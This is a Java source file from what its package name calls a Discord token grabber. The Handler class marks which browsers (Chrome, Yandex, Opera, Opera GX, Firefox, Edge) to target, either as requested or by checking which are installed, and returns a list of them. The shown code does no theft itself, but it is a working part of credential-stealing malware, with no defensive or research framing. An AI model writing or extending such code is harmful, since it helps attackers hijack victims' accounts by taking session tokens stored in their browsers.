package com.github.dedinc.discordtokengrabber.utils;

public class Handler {

	public boolean chr;
	public boolean yan;
	public boolean opr;
	public boolean opr_gx;
	public boolean frx;
	public boolean edg;
	
	public void handle(String browser) {
		if (browser != null) {
			if (browser.equalsIgnoreCase("chrome")) {
				checkBrowsers("chrome");
			}
			if (browser.equalsIgnoreCase("yandex")) {
				checkBrowsers("yandex");
			}
			if (browser.equalsIgnoreCase("opera")) {
				checkBrowsers("opera");
			}
			if (browser.equalsIgnoreCase("operagx")) {
				checkBrowsers("operagx");
			}
			if (browser.equalsIgnoreCase("firefox")) {
				checkBrowsers("firefox");
			}
			if (browser.equalsIgnoreCase("edge")) {
				checkBrowsers("edge");
			}
			if (!chr && !yan && !opr && !opr_gx && !frx && !edg) {
				checkBrowsers("all");
			}
		} else {
			checkBrowsers("all");
		}
	}
	
	public void checkBrowsers(String browser) {
		if (browser.equalsIgnoreCase("chrome") || browser.equalsIgnoreCase("all") && Helper.getBinaries().getChromeBinary()) {
			chr = true;
		}
		if (browser.equalsIgnoreCase("yandex") || browser.equalsIgnoreCase("all") && Helper.getBinaries().getYandexBinary()) {
			yan = true;
		}
		if (browser.equalsIgnoreCase("opera") || browser.equalsIgnoreCase("all") && Helper.getBinaries().getOperaBinary(false)) {
			opr = true;
		}
		if (browser.equalsIgnoreCase("operagx") || browser.equalsIgnoreCase("all") && Helper.getBinaries().getOperaBinary(true)) {
			opr_gx = true;
		}
		if (browser.equalsIgnoreCase("firefox") || browser.equalsIgnoreCase("all") && Helper.getBinaries().getFirefoxBinary()) {
			frx = true;
		}
		if (browser.equalsIgnoreCase("edge") || browser.equalsIgnoreCase("all") && Helper.getBinaries().getEdgeBinary()) {
			edg = true;
		}
	}
	
	public String getBrowsers() {
		String browsers = "";
		if (chr) {
			browsers = browsers + "Chrome\n";
		}
		if (yan) {
			browsers = browsers + "Yandex\n";
		}
		if (opr) {
			browsers = browsers + "Opera\n";
		}
		if (opr_gx) {
			browsers = browsers + "Opera GX\n";
		}
		if (frx) {
			browsers = browsers + "Firefox\n";
		}
		if (edg) {
			browsers = browsers + "Edge\n";
		}
		return browsers;
	}
}
